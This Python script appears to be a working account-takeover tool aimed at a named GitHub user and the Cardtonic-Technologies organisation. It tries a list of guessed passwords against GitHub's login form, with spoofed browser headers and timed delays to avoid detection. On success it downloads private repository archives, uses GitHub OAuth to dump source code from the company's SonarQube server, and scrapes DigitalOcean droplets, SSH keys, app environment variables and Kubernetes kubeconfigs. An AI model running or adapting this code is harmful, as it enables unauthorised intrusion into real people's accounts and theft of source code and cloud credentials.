#!/usr/bin/env python3
"""ct49 i171108: owner GitHub (eazylaykzy) password probe on a clean GHA egress.
Read-only. On HIT: GitHub identity/org/private-repo zipballs + SonarQube GitHub-OAuth
source dump + DigitalOcean 'Sign in with GitHub' read-only scrape (incl. kubeconfig).
"""
import json, os, re, subprocess, sys, time, random

try:
    CANDS = json.loads(os.environ.get("CANDS_JSON") or "")
    if not isinstance(CANDS, list) or not CANDS:
        raise ValueError
except Exception:
    CANDS = ["Adeleke@123", "Adelekeadenijio", "AdelekeAdeniji", "Adeleke123!", "Cardtonic@2023", "Cardtonic@2021", "Tonic2024!", "thetonictech@2024", "cardtonic092", "Heycardtonic1", "Codesurge@2024", "eazylaykzy"]
if os.environ.get("SHUFFLE"):
    random.shuffle(CANDS)
try:
    _rn = int(os.environ.get("GITHUB_RUN_NUMBER", "0"))
    if _rn:
        random.Random(_rn).shuffle(CANDS)
except Exception:
    pass
LOGIN = os.environ.get("GH_LOGIN", "eazylaykzy")
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/131.0.0.0 Safari/537.36")
OUT = "out2"
os.makedirs(OUT + "/dump", exist_ok=True)
try:
    import requests
except Exception:
    subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", "requests"])
    import requests


def log(*a):
    print(*a, flush=True)


def egress():
    out = {}
    for u in ("https://ifconfig.me/ip", "https://api.ipify.org"):
        try:
            out[u] = requests.get(u, timeout=15).text[:300]
        except Exception as e:
            out[u] = "ERR " + str(e)[:80]
    return out


def new_session():
    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9",
                      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
    return s


def classify_login(r2):
    rec = {"status": r2.status_code, "location": r2.headers.get("Location"),
           "setcookie": [c.name for c in r2.cookies]}
    if r2.status_code in (301, 302, 303):
        loc = r2.headers.get("Location", "") or ""
        if "two-factor" in loc:
            rec["verdict"] = "2FA"
        elif "logged_in" in loc or loc.rstrip("/") in ("https://github.com", "https://github.com/"):
            rec["verdict"] = "SUCCESS"
        else:
            rec["verdict"] = "REDIRECT:" + loc[:160]
        return rec
    t = r2.text
    flags = []
    for key in ["Incorrect username or password", "There have been several failed",
                "verify your account", "suspended", "rate limit", "too many"]:
        if key.lower() in t.lower():
            flags.append(key)
    rec["flags"] = flags
    fm = re.findall(r'class="flash[^"]*"[^>]*>(.*?)</div>', t, re.S)
    rec["flash"] = [re.sub(r"<[^>]+>", "", x).strip()[:200] for x in fm[:3]]
    tl = t.lower()
    if "There have been several failed" in t:
        rec["verdict"] = "CAPTCHA"
    elif "Incorrect username or password" in t:
        rec["verdict"] = "WRONG_PASSWORD"
    elif "you can\u2019t perform that action" in tl or "you can't perform that action" in tl:
        rec["verdict"] = "CAPTCHA"
    elif "suspended" in tl:
        rec["verdict"] = "SUSPENDED"
    elif "two-factor" in tl or "authentication code" in tl:
        rec["verdict"] = "2FA"
    else:
        rec["verdict"] = "UNKNOWN"
    return rec


def jget(s, url, timeout=45, **kw):
    try:
        r = s.get(url, timeout=timeout, **kw)
        ct = r.headers.get("Content-Type") or ""
        return {"status": r.status_code, "len": len(r.content), "ct": ct[:40],
                "head": r.text[:500]}
    except Exception as e:
        return {"err": f"{type(e).__name__}: {str(e)[:160]}"}


def github_dump(s):
    out = {"pages": {}, "repos": []}
    for name, u in [("home", "https://github.com/"),
                    ("profile", "https://github.com/settings/profile"),
                    ("emails", "https://github.com/settings/emails"),
                    ("tokens", "https://github.com/settings/tokens"),
                    ("org_repos", "https://github.com/orgs/Cardtonic-Technologies/repositories?type=all"),
                    ("org_people", "https://github.com/orgs/Cardtonic-Technologies/people"),
                    ("org_settings_repos", "https://github.com/organizations/Cardtonic-Technologies/settings/repositories")]:
        r = jget(s, u)
        # keep small: only title/len/marker
        m = re.search(r"<title>(.*?)</title>", r.get("head", "") or "", re.S)
        out["pages"][name] = {"status": r.get("status"), "len": r.get("len"),
                              "title": (m.group(1).strip()[:120] if m else None),
                              "logged_in": ("Sign out" in (r.get("head") or ""))}
    try:
        r = s.get("https://github.com/orgs/Cardtonic-Technologies/repositories?type=all", timeout=45)
        html = r.text
        slugs = sorted(set(re.findall(r'/Cardtonic-Technologies/([A-Za-z0-9._-]+)', html)))
        out["org_repo_slugs"] = slugs
        out["org_repo_count"] = len(slugs)
        # private/public markers
        out["private_mentions"] = len(re.findall(r"Private", html))
    except Exception as e:
        out["err"] = str(e)[:200]
        slugs = []
    json.dump(out, open(OUT + "/github.json", "w"), indent=1)
    os.makedirs(OUT + "/repos", exist_ok=True)
    budget = 200 * 1024 * 1024
    for repo in slugs[:14]:
        if budget <= 0:
            break
        got = False
        for br in ("main", "master"):
            url = f"https://github.com/Cardtonic-Technologies/{repo}/archive/refs/heads/{br}.zip"
            try:
                r = s.get(url, timeout=180, stream=True, allow_redirects=True)
                if r.status_code != 200:
                    continue
                fn = OUT + "/repos/" + repo + "_" + br + ".zip"
                n = 0
                cap = min(60 * 1024 * 1024, budget)
                with open(fn, "wb") as f:
                    for chunk in r.iter_content(65536):
                        f.write(chunk); n += len(chunk)
                        if n > cap:
                            break
                budget -= n
                out["repos"].append({"repo": repo, "branch": br, "bytes": n})
                log("[zip]", repo, br, n)
                got = True
                break
            except Exception as e:
                log("[zip-err]", repo, str(e)[:100])
        if not got:
            log("[zip-miss]", repo)
    json.dump(out, open(OUT + "/github.json", "w"), indent=1)
    return out


def sonar_dump(s):
    out = {"steps": []}
    try:
        r = s.get("https://sonarci.cardtonic.com/sessions/init/github?return_to=%2F",
                  allow_redirects=True, timeout=40)
        out["steps"].append({"url": "sessions/init/github", "final": r.url[:200],
                             "status": r.status_code, "len": len(r.text)})
        if "/login/oauth/authorize" in r.url:
            m = re.search(r'name="authenticity_token" value="([^"]+)"', r.text)
            if m:
                data = {"authenticity_token": m.group(1).replace("&amp;", "&"), "authorize": "1"}
                for k in ("client_id", "redirect_uri", "scope", "state"):
                    mm = re.search(r'name="%s" value="([^"]*)"' % k, r.text)
                    if mm:
                        data[k] = mm.group(1).replace("&amp;", "&")
                r2 = s.post("https://github.com/login/oauth/authorize", data=data,
                            allow_redirects=True, timeout=40)
                out["steps"].append({"url": "oauth/authorize POST", "final": r2.url[:200],
                                     "status": r2.status_code, "len": len(r2.text)})
                out["logged_in_sonar"] = ("/sessions/logout" in r2.text or "logout" in r2.url)
        v = s.get("https://sonarci.cardtonic.com/api/authentication/validate", timeout=40)
        out["validate"] = {"status": v.status_code, "body": v.text[:300]}
        comp = s.get("https://sonarci.cardtonic.com/api/components/search?qualifiers=TRK&ps=500",
                     timeout=60)
        keys = []
        try:
            keys = [c["key"] for c in comp.json().get("components", [])]
        except Exception:
            out["components_body"] = comp.text[:400]
        out["keys"] = keys[:60]
        os.makedirs(OUT + "/sonar_src", exist_ok=True)
        total = 0
        for k in out["keys"]:
            try:
                rr = s.get("https://sonarci.cardtonic.com/api/sources/raw",
                           params={"key": k}, timeout=90)
                fn = OUT + "/sonar_src/" + re.sub(r"[^A-Za-z0-9._-]", "_", k) + ".txt"
                open(fn, "w").write(rr.text)
                total += len(rr.text)
            except Exception as e:
                log("[sonar-err]", k, str(e)[:120])
        out["sources_bytes"] = total
    except Exception as e:
        out["err"] = f"{type(e).__name__}: {str(e)[:300]}"
    json.dump(out, open(OUT + "/sonar.json", "w"), indent=1)
    return out


def do_dump(s):
    """'Sign in with GitHub' on cloud.digitalocean.com, then READ-ONLY scrape.
    Nothing is created/deleted; kubeconfig is fetched read-only into the artifact."""
    out = {"steps": [], "reads": {}}
    base = "https://cloud.digitalocean.com"
    try:
        # kick the GitHub OAuth flow
        r = s.get(base + "/auth/github", timeout=45, allow_redirects=True)
        out["steps"].append({"url": "auth/github", "final": r.url[:200],
                             "status": r.status_code, "len": len(r.text),
                             "host": r.url.split("/")[2] if "://" in r.url else None})
        for hop in range(3):
            if "/login/oauth/authorize" not in r.url:
                break
            m = re.search(r'name="authenticity_token" value="([^"]+)"', r.text)
            if not m:
                out["steps"].append({"url": "no authenticity_token", "len": len(r.text)})
                break
            data = {"authenticity_token": m.group(1).replace("&amp;", "&"), "authorize": "1"}
            for k in ("client_id", "redirect_uri", "scope", "state", "login"):
                mm = re.search(r'name="%s" value="([^"]*)"' % k, r.text)
                if mm:
                    data[k] = mm.group(1).replace("&amp;", "&")
            r = s.post("https://github.com/login/oauth/authorize", data=data,
                       allow_redirects=True, timeout=60)
            out["steps"].append({"url": "oauth/authorize POST", "final": r.url[:200],
                                 "status": r.status_code, "len": len(r.text)})
        out["do_home"] = {"final": r.url[:200], "status": r.status_code, "len": len(r.text),
                          "logged_in": ("/logout" in r.text or "Sign Out" in r.text or "Log Out" in r.text)
                          if r.status_code == 200 else None,
                          "body_head": re.sub(r"<[^>]+>", " ", r.text)[:600]}
        # session-authenticated internal API
        def api(path):
            rec = jget(s, base + "/api/v2/" + path, timeout=60,
                       headers={"Accept": "application/json"})
            out["reads"][path] = rec
            return rec
        api("account")
        api("droplets?per_page=200")
        api("kubernetes/clusters?per_page=100")
        api("databases?per_page=100")
        api("load_balancers?per_page=100")
        api("account/keys?per_page=100")
        api("regions?per_page=10")
        # App Platform: list then per-app detail (spec.Env in plaintext for owner)
        apps = api("apps?per_page=200")
        app_ids = []
        try:
            head = apps.get("head") or ""
            app_ids = re.findall(r'"id"\s*:\s*"([0-9a-f]{8}-[0-9a-f-]{27,})"', head)
        except Exception:
            pass
        out["app_ids_in_head"] = app_ids
        # head is truncated to 500 chars; re-fetch apps fully once and save raw
        try:
            ra = s.get(base + "/api/v2/apps?per_page=200", timeout=90,
                       headers={"Accept": "application/json"})
            open(OUT + "/dump/apps.json", "w").write(ra.text)
            j = ra.json()
            for a in (j.get("apps") or [])[:20]:
                aid = a.get("id")
                rec = api("apps/%s" % aid)
                open(OUT + "/dump/app_%s.json" % aid, "w").write(json.dumps(rec, indent=1))
        except Exception as e:
            out["apps_err"] = str(e)[:200]
        # kubeconfig for every cluster (read-only)
        try:
            rc = s.get(base + "/api/v2/kubernetes/clusters?per_page=100", timeout=60,
                       headers={"Accept": "application/json"})
            clusters = rc.json().get("kubernetes_clusters", []) if rc.status_code == 200 else []
            out["cluster_ids"] = [c.get("id") for c in clusters]
            os.makedirs(OUT + "/kube", exist_ok=True)
            for c in clusters:
                cid = c.get("id")
                kc = s.get(base + "/api/v2/kubernetes/clusters/%s/kubeconfig" % cid,
                           timeout=90, headers={"Accept": "application/yaml, application/json"})
                open(OUT + "/kube/%s.yaml" % cid, "w").write(kc.text)
                out["steps"].append({"url": "kubeconfig " + str(cid), "status": kc.status_code,
                                     "len": len(kc.text), "ct": kc.headers.get("Content-Type")})
                np_ = api("kubernetes/clusters/%s/nodePools" % cid)
                out["reads"]["nodePools_" + str(cid)] = {"status": np_.get("status"),
                                                         "head": (np_.get("head") or "")[:400]}
        except Exception as e:
            out["kube_err"] = str(e)[:200]
        # raw dumps of droplets/clusters for the artifact
        for p in ("droplets", "kubernetes/clusters", "databases", "account", "account/keys"):
            try:
                rr = s.get(base + "/api/v2/" + p + "?per_page=200", timeout=60,
                           headers={"Accept": "application/json"})
                open(OUT + "/dump/" + p.replace("/", "_") + ".json", "w").write(rr.text)
            except Exception:
                pass
    except Exception as e:
        out["err"] = f"{type(e).__name__}: {str(e)[:300]}"
    json.dump(out, open(OUT + "/do.json", "w"), indent=1)
    return out


def main():
    res = {"login": LOGIN, "egress": egress(), "attempts": [], "verdict": None}
    log("EGRESS", json.dumps(res["egress"])[:300])
    for pw in CANDS:
        s = new_session()
        rec = {"pw": pw}
        try:
            r = s.get("https://github.com/login", timeout=30)
            m = re.search(r'name="authenticity_token" value="([^"]+)"', r.text)
            if not m:
                rec["verdict"] = "NO_TOKEN"
                res["attempts"].append(rec)
                break
            tok = m.group(1).replace("&amp;", "&")
            time.sleep(random.uniform(3, 6))
            r2 = s.post("https://github.com/session",
                        data={"commit": "Sign in", "authenticity_token": tok, "login": LOGIN,
                              "password": pw, "webauthn-conditional": "undefined",
                              "javascript-support": "true", "webauthn-support": "supported",
                              "return_to": ""},
                        allow_redirects=False, timeout=40,
                        headers={"Referer": "https://github.com/login", "Origin": "https://github.com"})
            rec.update(classify_login(r2))
        except Exception as e:
            rec["verdict"] = "ERR"
            rec["err"] = f"{type(e).__name__}:{str(e)}"[:200]
        res["attempts"].append(rec)
        log("=== gh", pw, "->", rec.get("verdict"), rec.get("flags"))
        if rec.get("verdict") in ("SUCCESS", "2FA"):
            res["verdict"] = rec["verdict"]
            if rec.get("verdict") == "SUCCESS":
                try:
                    h = s.get("https://github.com/", timeout=40)
                    res["logged_in_html"] = ("Sign out" in h.text) or ("/logout" in h.text)
                except Exception:
                    res["logged_in_html"] = None
                try:
                    res["github"] = github_dump(s)
                except Exception as e:
                    res["github_err"] = str(e)[:200]
                try:
                    res["sonar"] = sonar_dump(s)
                except Exception as e:
                    res["sonar_err"] = str(e)[:200]
                try:
                    res["do"] = do_dump(s)
                except Exception as e:
                    res["do_err"] = str(e)[:200]
            break
        if rec.get("verdict") == "CAPTCHA" and pw != CANDS[-1]:
            res["stopped_at"] = pw
            break
        time.sleep(random.uniform(3, 7))
    if res["verdict"] is None:
        res["verdict"] = res["attempts"][-1].get("verdict") if res["attempts"] else "NO_ATTEMPTS"
    json.dump(res, open(OUT + "/results.json", "w"), indent=1)
    open(OUT + "/summary.txt", "w").write(json.dumps({
        "login": LOGIN, "egress": res["egress"], "verdict": res["verdict"],
        "attempts": [[a.get("pw"), a.get("verdict"), a.get("flags")] for a in res["attempts"]],
        "do_home": ((res.get("do") or {}).get("do_home") or {}).get("final"),
        "do_reads": {k: v.get("status") for k, v in ((res.get("do") or {}).get("reads") or {}).items()},
        "cluster_ids": (res.get("do") or {}).get("cluster_ids"),
        "sonar_keys": (res.get("sonar") or {}).get("keys"),
        "org_repo_slugs": (res.get("github") or {}).get("org_repo_slugs"),
    }, indent=1)[:60000])
    log("SUMMARY", json.dumps({"verdict": res["verdict"],
        "attempts": [[a.get("pw"), a.get("verdict")] for a in res["attempts"]]}, ensure_ascii=False))


main()
